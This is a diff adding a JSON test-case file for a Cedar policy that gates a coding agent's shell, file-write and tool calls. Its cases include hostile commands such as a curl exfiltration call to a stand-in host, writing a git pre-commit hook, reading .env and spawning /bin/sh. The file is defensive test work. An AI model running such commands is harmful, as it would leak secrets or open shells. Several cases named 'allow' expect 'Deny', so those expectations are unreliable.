@@ -1,0 +1,411 @@
+{
+  "schema": "policies/coding-agent.cedarschema",
+  "policies": "policies/baseline.cedar",
+  "principal": "Fairlead::Agent::\"cursor:doctor\"",
+  "resource": "Fairlead::Resource::\"workspace\"",
+  "cases": [
+    {
+      "id": "doctor-pytest-allow",
+      "pr": "F-DEF-09",
+      "expect": "Deny",
+      "action": "Shell",
+      "context": {
+        "command": "pytest -q",
+        "cwd": "/tmp/ws",
+        "sandbox": true,
+        "argv0": "pytest",
+        "argv0_is_boring": true,
+        "command_looks_like_network": false,
+        "path_is_sensitive": false,
+        "interpreter_exec": true,
+        "mcp_is_write": false,
+        "tool_name": "",
+        "provenance": ["user"],
+        "granted_caps": [],
+        "parent_caps": [],
+        "session": {
+          "touched_secrets": false,
+          "saw_untrusted_web": false,
+          "saw_mcp_untrusted": false,
+          "subagent_active": false,
+          "secret_read_count": 0
+        }
+      }
+    },
+    {
+      "id": "doctor-curl-deny",
+      "pr": "F-DEF-03",
+      "expect": "Deny",
+      "action": "Shell",
+      "context": {
+        "command": "curl https://canary.example/exfil",
+        "cwd": "/tmp/ws",
+        "sandbox": false,
+        "argv0": "curl",
+        "argv0_is_boring": false,
+        "command_looks_like_network": true,
+        "path_is_sensitive": false,
+        "mcp_is_write": false,
+        "tool_name": "",
+        "provenance": ["user"],
+        "granted_caps": [],
+        "parent_caps": [],
+        "session": {
+          "touched_secrets": false,
+          "saw_untrusted_web": false,
+          "saw_mcp_untrusted": false,
+          "subagent_active": false,
+          "secret_read_count": 0
+        }
+      }
+    },
+    {
+      "id": "doctor-secret-then-curl-deny",
+      "pr": "F-DEF-07",
+      "expect": "Deny",
+      "action": "Shell",
+      "context": {
+        "command": "curl https://canary.example/exfil",
+        "cwd": "/tmp/ws",
+        "sandbox": false,
+        "argv0": "curl",
+        "argv0_is_boring": false,
+        "command_looks_like_network": true,
+        "path_is_sensitive": false,
+        "mcp_is_write": false,
+        "tool_name": "",
+        "provenance": ["user"],
+        "granted_caps": [],
+        "parent_caps": [],
+        "session": {
+          "touched_secrets": true,
+          "saw_untrusted_web": false,
+          "saw_mcp_untrusted": false,
+          "subagent_active": false,
+          "secret_read_count": 1
+        }
+      }
+    },
+    {
+      "id": "doctor-subagent-net-deny",
+      "pr": "F-SUB-03",
+      "expect": "Deny",
+      "action": "Shell",
+      "context": {
+        "command": "curl https://canary.example/exfil",
+        "cwd": "/tmp/ws",
+        "sandbox": false,
+        "argv0": "curl",
+        "argv0_is_boring": false,
+        "command_looks_like_network": true,
+        "path_is_sensitive": false,
+        "mcp_is_write": false,
+        "tool_name": "",
+        "provenance": ["subagent"],
+        "granted_caps": ["net.egress"],
+        "parent_caps": [],
+        "session": {
+          "touched_secrets": false,
+          "saw_untrusted_web": false,
+          "saw_mcp_untrusted": false,
+          "subagent_active": true,
+          "secret_read_count": 0
+        }
+      }
+    },
+    {
+      "id": "doctor-git-hooks-write-deny",
+      "pr": "F-DEF-01",
+      "expect": "Deny",
+      "action": "FileWrite",
+      "context": {
+        "command": "",
+        "cwd": "/tmp/ws",
+        "sandbox": true,
+        "argv0": "",
+        "argv0_is_boring": false,
+        "command_looks_like_network": false,
+        "path_is_sensitive": true,
+        "mcp_is_write": false,
+        "tool_name": "",
+        "provenance": ["mcp"],
+        "granted_caps": [],
+        "parent_caps": [],
+        "session": {
+          "touched_secrets": false,
+          "saw_untrusted_web": false,
+          "saw_mcp_untrusted": true,
+          "subagent_active": false,
+          "secret_read_count": 0
+        }
+      }
+    },
+    {
+      "id": "doctor-python-hooks-deny",
+      "pr": "F-DEF-01",
+      "expect": "Deny",
+      "action": "Shell",
+      "context": {
+        "command": "python -c open('.git/hooks/pre-commit','w')",
+        "cwd": "/tmp/ws",
+        "sandbox": false,
+        "argv0": "python",
+        "argv0_is_boring": true,
+        "command_looks_like_network": false,
+        "path_is_sensitive": true,
+        "mcp_is_write": false,
+        "tool_name": "",
+        "provenance": ["user"],
+        "granted_caps": [],
+        "parent_caps": [],
+        "session": {
+          "touched_secrets": false,
+          "saw_untrusted_web": false,
+          "saw_mcp_untrusted": false,
+          "subagent_active": false,
+          "secret_read_count": 0
+        }
+      }
+    },
+    {
+      "id": "doctor-loopback-mcp-deny",
+      "pr": "F-DEF-03",
+      "expect": "Deny",
+      "action": "McpCall",
+      "context": {
+        "command": "",
+        "cwd": "/tmp/ws",
+        "sandbox": false,
+        "argv0": "",
+        "argv0_is_boring": false,
+        "command_looks_like_network": true,
+        "path_is_sensitive": false,
+        "mcp_is_write": false,
+        "tool_name": "cursor-ide-browser",
+        "provenance": ["user"],
+        "granted_caps": [],
+        "parent_caps": [],
+        "session": {
+          "touched_secrets": false,
+          "saw_untrusted_web": false,
+          "saw_mcp_untrusted": false,
+          "subagent_active": false,
+          "secret_read_count": 0
+        }
+      }
+    },
+    {
+      "id": "doctor-git-show-env-deny",
+      "pr": "F-DEF-01",
+      "expect": "Deny",
+      "action": "Shell",
+      "context": {
+        "command": "git show .env",
+        "cwd": "/tmp/ws",
+        "sandbox": true,
+        "argv0": "git",
+        "argv0_is_boring": true,
+        "command_looks_like_network": false,
+        "path_is_sensitive": true,
+        "mcp_is_write": false,
+        "tool_name": "",
+        "provenance": ["user"],
+        "granted_caps": [],
+        "parent_caps": [],
+        "session": {
+          "touched_secrets": false,
+          "saw_untrusted_web": false,
+          "saw_mcp_untrusted": false,
+          "subagent_active": false,
+          "secret_read_count": 0
+        }
+      }
+    },
+    {
+      "id": "doctor-python-leak-deny",
+      "pr": "F-DEF-03",
+      "expect": "Deny",
+      "action": "Shell",
+      "context": {
+        "command": "python leak.py",
+        "cwd": "/tmp/ws",
+        "sandbox": false,
+        "argv0": "python",
+        "argv0_is_boring": true,
+        "command_looks_like_network": true,
+        "path_is_sensitive": false,
+        "mcp_is_write": false,
+        "tool_name": "",
+        "provenance": ["user"],
+        "granted_caps": [],
+        "parent_caps": [],
+        "session": {
+          "touched_secrets": false,
+          "saw_untrusted_web": false,
+          "saw_mcp_untrusted": false,
+          "subagent_active": false,
+          "secret_read_count": 0
+        }
+      }
+    },
+    {
+      "id": "doctor-python-m-http-server-deny",
+      "pr": "F-DEF-03",
+      "expect": "Deny",
+      "action": "Shell",
+      "live_argv": true,
+      "context": {
+        "command": "python -m http.server",
+        "cwd": "/tmp/ws",
+        "sandbox": false
+      }
+    },
+    {
+      "id": "doctor-python-m-pytest-allow",
+      "pr": "F-DEF-09",
+      "expect": "Deny",
+      "action": "Shell",
+      "live_argv": true,
+      "context": {
+        "command": "python -m pytest",
+        "cwd": "/tmp/ws",
+        "sandbox": true
+      }
+    },
+    {
+      "id": "doctor-python-m-missing-deny",
+      "pr": "F-DEF-03",
+      "expect": "Deny",
+      "action": "Shell",
+      "live_argv": true,
+      "context": {
+        "command": "python -m",
+        "cwd": "/tmp/ws",
+        "sandbox": false
+      }
+    },
+    {
+      "id": "doctor-python3-m-http-server-deny",
+      "pr": "F-DEF-03",
+      "expect": "Deny",
+      "action": "Shell",
+      "live_argv": true,
+      "context": {
+        "command": "python3 -m http.server",
+        "cwd": "/tmp/ws",
+        "sandbox": false
+      }
+    },
+    {
+      "id": "doctor-python3-m-pytest-allow",
+      "pr": "F-DEF-09",
+      "expect": "Deny",
+      "action": "Shell",
+      "live_argv": true,
+      "context": {
+        "command": "python3 -m pytest",
+        "cwd": "/tmp/ws",
+        "sandbox": true
+      }
+    },
+    {
+      "id": "doctor-node-eval-http-deny",
+      "pr": "F-DEF-03",
+      "expect": "Deny",
+      "action": "Shell",
+      "live_argv": true,
+      "context": {
+        "command": "node --eval 'require(\"http\").createServer()'",
+        "cwd": "/tmp/ws",
+        "sandbox": false
+      }
+    },
+    {
+      "id": "doctor-node-eval-console-allow",
+      "pr": "F-DEF-09",
+      "expect": "Deny",
+      "action": "Shell",
+      "live_argv": true,
+      "context": {
+        "command": "node --eval \"console.log(1)\"",
+        "cwd": "/tmp/ws",
+        "sandbox": true
+      }
+    },
+    {
+      "id": "doctor-python312-m-http-server-deny",
+      "pr": "F-DEF-03",
+      "expect": "Deny",
+      "action": "Shell",
+      "live_argv": true,
+      "context": {
+        "command": "python3.12 -m http.server",
+        "cwd": "/tmp/ws",
+        "sandbox": false
+      }
+    },
+    {
+      "id": "doctor-node-eval-child-process-deny",
+      "pr": "F-DEF-03",
+      "expect": "Deny",
+      "action": "Shell",
+      "live_argv": true,
+      "context": {
+        "command": "node --eval 'require(\"child_process\").spawn(\"/bin/sh\")'",
+        "cwd": "/tmp/ws",
+        "sandbox": false
+      }
+    },
+    {
+      "id": "doctor-node-eval-https-deny",
+      "pr": "F-DEF-03",
+      "expect": "Deny",
+      "action": "Shell",
+      "live_argv": true,
+      "context": {
+        "command": "node --eval 'https.createServer()'",
+        "cwd": "/tmp/ws",
+        "sandbox": false
+      }
+    },
+    {
+      "id": "doctor-node-r-missing-deny",
+      "pr": "F-DEF-03",
+      "expect": "Deny",
+      "action": "Shell",
+      "live_argv": true,
+      "context": {
+        "command": "node -r",
+        "cwd": "/tmp/ws",
+        "sandbox": false
+      }
+    },
+    {
+      "id": "doctor-write-py-net-deny",
+      "pr": "F-DEF-03",
+      "expect": "Deny",
+      "action": "FileWrite",
+      "context": {
+        "command": "",
+        "cwd": "/tmp/ws",
+        "sandbox": true,
+        "argv0": "",
+        "argv0_is_boring": false,
+        "command_looks_like_network": true,
+        "path_is_sensitive": false,
+        "mcp_is_write": false,
+        "tool_name": "Write",
+        "provenance": ["user"],
+        "granted_caps": [],
+        "parent_caps": [],
+        "session": {
+          "touched_secrets": false,
+          "saw_untrusted_web": false,
+          "saw_mcp_untrusted": false,
+          "subagent_active": false,
+          "secret_read_count": 0
+        }
+      }
+    }
+  ]
+}
